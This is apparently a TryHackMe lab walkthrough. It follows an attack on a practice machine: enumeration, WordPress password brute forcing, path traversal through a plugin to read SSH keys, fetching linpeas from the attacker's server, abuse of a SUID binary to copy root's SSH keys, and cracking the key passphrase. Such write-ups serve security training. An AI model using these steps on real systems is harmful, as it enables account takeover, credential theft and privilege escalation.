# Researcher (TryHackMe - Lab)

#### Description

An enigmatic signal originating from a distant galaxy has led you to a hidden research facility located beneath an asteroid field. This facility is rumored to house ancient, advanced alien technology that could revolutionize our understanding of the cosmos.
Your objective is to breach the facility's sophisticated security systems. Only by gaining access to its data and systems can you uncover the profound secrets and potentially groundbreaking knowledge concealed within.

## Nmap Scan

* Initial nmap scan
```code
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -T4 10.10.202.113
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 17:44 IST
Nmap scan report for 10.10.202.113
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             653 Sep 19 16:38 space.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.28.127
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 23:7e:5e:ae:7f:aa:dd:c7:f3:1e:10:db:41:cf:12:54 (RSA)
|   256 eb:40:df:b9:0a:4f:ac:fc:40:16:ac:dc:27:a1:1b:06 (ECDSA)
|_  256 a4:8c:b8:d6:01:d6:c8:b5:35:31:e4:da:0d:b2:72:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.03 seconds

```


## FTP Enumeration

```code
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.202.113                                                                                                                      
Connected to 10.10.202.113.
220 (vsFTPd 3.0.3)
Name (10.10.202.113:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||39984|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             653 Sep 19 16:38 space.txt
226 Directory send OK.
ftp> get space.txt
local: space.txt remote: space.txt
229 Entering Extended Passive Mode (|||54101|)
150 Opening BINARY mode data connection for space.txt (653 bytes).
100% |************************************************************************************************************************************************|   653       14.15 MiB/s    00:00 ETA
226 Transfer complete.
653 bytes received in 00:00 (3.92 KiB/s)
ftp> exit
221 Goodbye.   
```

* The content of the ```space.txt``` file
```code
┌──(kali㉿kali)-[~]
└─$ cat space.txt 
Space is a vast and enigmatic expanse that captivates our imagination, stretching endlessly beyond our planet.
It is a realm where stars are born, galaxies dance, and black holes silently exert their gravitational pull.
The darkness is punctuated by the twinkling of distant suns, while vibrant nebulae swirl in hues that hint
at the birth of new worlds. In this infinite void, the laws of physics behave in astonishing ways, bending
time and space around massive objects. Whether we gaze up at the night sky or dream of interstellar adventures,
space invites exploration and wonder, reminding us of the mysteries that lie beyond our earthly existence.

```


## Webserver Enumeration 

* The webserver has apache2 default page
![[Screenshot 2024-12-04 175206.png]]

* Now, we have to do directory brute force
* Using gobuster we will do directory brute force
```code
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.202.113/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.202.113/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/myblog               (Status: 301) [Size: 315] [--> http://10.10.202.113/myblog/]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

* There is a directory called myblog. In this directory there is a wordpress website running.
![[Pasted image 20241204180100.png]]

![[Pasted image 20241204180203.png]]

#### Enumeration Using the WPScan 
---

```code
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.10.202.113/myblog/ -e
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.202.113/myblog/ [10.10.202.113]
[+] Started: Wed Dec  4 18:07:46 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.202.113/myblog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.202.113/myblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.202.113/myblog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.202.113/myblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.6.2 identified (Outdated, released on 2024-09-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.202.113/myblog/feed/, <generator>https://wordpress.org/?v=6.6.2</generator>
 |  - http://10.10.202.113/myblog/comments/feed/, <generator>https://wordpress.org/?v=6.6.2</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://10.10.202.113/myblog/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://10.10.202.113/myblog/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://10.10.202.113/myblog/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.202.113/myblog/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.2'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:31 <=============================================================================================================> (652 / 652) 100.00% Time: 00:00:31
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:02:02 <===========================================================================================================> (2575 / 2575) 100.00% Time: 00:02:02

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <==============================================================================================================> (137 / 137) 100.00% Time: 00:00:06

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:03 <====================================================================================================================> (75 / 75) 100.00% Time: 00:00:03

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:04 <=========================================================================================================> (100 / 100) 100.00% Time: 00:00:04

[i] Medias(s) Identified:

[+] http://10.10.202.113/myblog/?attachment_id=15
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://10.10.202.113/myblog/?attachment_id=17
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] carlos
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.202.113/myblog/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://10.10.202.113/myblog/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Dec  4 18:10:39 2024
[+] Requests Done: 3552
[+] Cached Requests: 48
[+] Data Sent: 1.001 MB
[+] Data Received: 1.077 MB
[+] Memory used: 285.047 MB
[+] Elapsed time: 00:02:52

```

* We find a user name called carlos
* Now we will brute force the password of the username
```code
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://10.10.202.113/myblog/ -U carlos -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.202.113/myblog/ [10.10.202.113]
[+] Started: Wed Dec  4 18:13:18 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.202.113/myblog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.202.113/myblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.202.113/myblog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.202.113/myblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.6.2 identified (Outdated, released on 2024-09-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.202.113/myblog/feed/, <generator>https://wordpress.org/?v=6.6.2</generator>
 |  - http://10.10.202.113/myblog/comments/feed/, <generator>https://wordpress.org/?v=6.6.2</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://10.10.202.113/myblog/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://10.10.202.113/myblog/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://10.10.202.113/myblog/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.202.113/myblog/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:07 <==============================================================================================================> (137 / 137) 100.00% Time: 00:00:07

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - carlos / brooklyn                                                                                                                                                                
Trying carlos / colombia Time: 00:00:37 <                                                                                                            > (460 / 14344852)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: carlos, Password: brooklyn

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Dec  4 18:14:13 2024
[+] Requests Done: 631
[+] Cached Requests: 7
[+] Data Sent: 291.564 KB
[+] Data Received: 708.739 KB
[+] Memory used: 297.578 MB
[+] Elapsed time: 00:00:55

```


*  Now we will login to the WordPress website using those credential
![[Pasted image 20241204181605.png]]


* We found a custom extension called "Researcher"
![[Pasted image 20241204181715.png]]

* We found that this extension read file from the server and display to the website's research page.
![[Pasted image 20241204182005.png]]

* Now we try to read the file ```/etc/passwd``` . We change the file path to ```../../../../etc/passwd``` and save.

![[Pasted image 20241204182228.png]]

* After change the file path, the research page display this
![[Pasted image 20241204182410.png]]

* We try to see the source of the page. It show the base64 enocde output of the file
![[Pasted image 20241204182459.png]]

* now we need to decode the base64 encoded string
![[Pasted image 20241204182649.png]]

* Now need to see the ```.bash_history``` of the user. So we give ```/home/carlos/.bash_history``` to read the bash history.
![[Pasted image 20241204183340.png]]
* In the source code
![[Pasted image 20241204183500.png]]
* After decode the base64 encoded ```.bash_history```. We can see the bash_history of the user. Where user copy the id_rsa to id_rsa.bak
![[Pasted image 20241204183623.png]]

* Try read the ```id_rsa.bak``` 
![[Pasted image 20241204183845.png]]
* The base 64 encoded format of the ```id_rsa.bak``` is
![[Pasted image 20241204184011.png]]

* After decode the base64 encoded string, we get the ssh key to login the system.
![[Pasted image 20241204184113.png]]

* Then we write the ```id_rsa``` key in ```id_rsa```file.
* Then we give the sufficient permission to the file.
```code
chmod 600 id_rsa
```
* Then login to the system using the ssh key
```code
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa carlos@10.10.202.113
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Wed Dec  4 13:15:42 UTC 2024

  System load:  0.01               Processes:           104
  Usage of /:   24.5% of 18.53GB   Users logged in:     0
  Memory usage: 44%                IP address for eth0: 10.10.202.113
  Swap usage:   0%


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

146 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 18.04 at
https://ubuntu.com/18-04

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Dec  4 13:13:04 2024 from 10.17.28.127
carlos@researcher:~$ 

```

* Now here you can read the user flag
```
carlos@researcher:~$ ls
flag.txt
```
* Then for the privilege escalation we need to download the linpeas.sh.
* Then we will transfer the linpeas.sh file to the victim machine.
* In the attacker machine we start a Serer using the python
```
┌──(kali㉿kali)-[~/Tools]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
* In the victim machine we download the linpeas.sh
```code
carlos@researcher:~$ wget http://10.17.28.127/linpeas.sh
--2024-12-04 13:21:05--  http://10.17.28.127/linpeas.sh
Connecting to 10.17.28.127:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 827841 (808K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                                      100%[====================================================================================================>] 808.44K   550KB/s    in 1.5s    

2024-12-04 13:21:07 (550 KB/s) - ‘linpeas.sh’ saved [827841/827841]

carlos@researcher:~$ 

```
* Now give the permission the the lipeas.sh file
```code
 chmod +x linpeas.sh
```
* Now run the lipeas.sh
* After running the linpeas.sh file. We found a suid binary 
```code
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                             
-rwsr-xr-- 1 root messagebus 42K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                    
-rwsr-xr-x 1 root root 128K May 29  2023 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 99K May  5  2023 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 14K Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 427K Mar 30  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 37K Nov 29  2022 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 22K Jan 12  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 146K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 75K Nov 29  2022 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 75K Nov 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Nov 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 37K Nov 29  2022 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 40K Nov 29  2022 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Nov 29  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44K Nov 29  2022 /bin/su
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-sr-x 1 root root 8.2K Sep 19 18:26 /opt/publish (Unknown SUID binary!)

```

* After go to the /opt folder, we find the binary and a python script
```
carlos@researcher:/opt$ ls -al
total 28
drwxr-xr-x  3 root root 4096 Sep 19 19:06 .
drwxr-xr-x 24 root root 4096 Sep 19 03:08 ..
drwxr-xr-x  2 root root 4096 Sep 19 18:09 carlos-research
-rwsr-sr-x  1 root root 8352 Sep 19 18:26 publish
-rwxrwxr-x  1 root root  858 Sep 19 16:49 publish.py
carlos@researcher:/opt$ 

```
* The code of the ```publish.py``` 
```code
#!/usr/bin/python3
import os
import shutil

def copy_files(src, dest):
    try:
        for filename in os.listdir(src):
            full_file_name = os.path.join(src, filename)
            if os.path.isfile(full_file_name):
                shutil.copy(full_file_name, dest)
                os.chmod(os.path.join(dest, filename), 0o644)
        print(f"Files from {src} have been copied to {dest} ane are now globally redable")
    except Exception as e:
        print(f"Error: {e}")

def main():
    default_location = "/opt/carlos-research"
    destination = "/var/www/html/myblog/wp-content/uploads"

    user_input = input(f"Please input the location of the reports (defaut: {default_location}) :")
    src_location = default_location if user_input == '' else user_input

    copy_files(src_location, destination)

if __name__ == "__main__":
    main()

```
* When i run ```./publish.py``` alone it give permission error
```code
carlos@researcher:/opt$ ./publish.py 
Please input the location of the reports (defaut: /opt/carlos-research) :
Error: [Errno 13] Permission denied: '/var/www/html/myblog/wp-content/uploads/jupiter.txt'
```

* But  when i run the ```./publish binary``` it can run without any issue. And it copy file from the input folder to the /var/www/html/myblog/wp-content/uploads direcory.
```code
carlos@researcher:/opt$ ./publish
Please input the location of the reports (defaut: /opt/carlos-research) :
Files from /opt/carlos-research have been copied to /var/www/html/myblog/wp-content/uploads ane are now globally redable
carlos@researcher:/opt$ 
```

* So we try to read the ```/root/.ssh``` directory
```code
carlos@researcher:/opt$ ./publish
Please input the location of the reports (defaut: /opt/carlos-research) :/root/.ssh 
Files from /root/.ssh have been copied to /var/www/html/myblog/wp-content/uploads ane are now globally redable

```

* Now we can read the root id_rsa file to the ```/var/www/html/myblog/wp-content/uploads``` directory
```code
carlos@researcher:/var/www/html/myblog/wp-content/uploads$ ls -al
total 36
drwxrwxrwx 3 www-data www-data 4096 Dec  4 13:47 .
drwxr-xr-x 5 www-data www-data 4096 Dec  4 12:46 ..
drwxr-xr-x 4 www-data www-data 4096 Dec  4 12:29 2024
-rw-r--r-- 1 root     carlos    741 Dec  4 13:47 authorized_keys
-rw-r--r-- 1 www-data www-data 1937 Dec  4 13:36 earth.txt
-rw-r--r-- 1 root     carlos   3326 Dec  4 13:47 id_rsa
-rw-r--r-- 1 root     carlos    741 Dec  4 13:47 id_rsa.pub
-rw-r--r-- 1 www-data www-data 2352 Dec  4 13:36 jupiter.txt
-rw-r--r-- 1 www-data www-data 1692 Dec  4 13:36 sun.txt
carlos@researcher:/var/www/html/myblog/wp-content/uploads$ 

```

* Now, save the id_rsa file in the attacker system and give the file the sufficient permission to the file.
* Now, we need to crack the passphrase of the ssh key. For that first we need to generate the file to john format
```code
┌──(kali㉿kali)-[~]
└─$ ssh2john id_rsa2 > hash
```

* Now, we need to crach the passphrase of the file using john
```code
┌──(kali㉿kali)-[~]
└─$ john hash -format=ssh -w /usr/share/wordlists/rockyou.txt
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
santiago         (id_rsa2)     
1g 0:00:00:00 DONE (2024-12-04 19:59) 100.0g/s 217600p/s 217600c/s 217600C/s love123..santiago
Use the "--show" option to display all of the cracked passwords reliably
Session completed.   
```

* Now, using the passphrase we can login to the system using the ssh key.
```code
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa2 root@10.10.202.113
Enter passphrase for key 'id_rsa2': 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Wed Dec  4 14:30:38 UTC 2024

  System load:  0.0                Processes:           109
  Usage of /:   24.5% of 18.53GB   Users logged in:     1
  Memory usage: 62%                IP address for eth0: 10.10.202.113
  Swap usage:   0%


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

146 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 18.04 at
https://ubuntu.com/18-04

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Sep 20 09:19:38 2024 from 192.168.74.128
root@researcher:~# 
```

* Now we can read the root flag
```code
root@researcher:~# ls
flag.txt

```
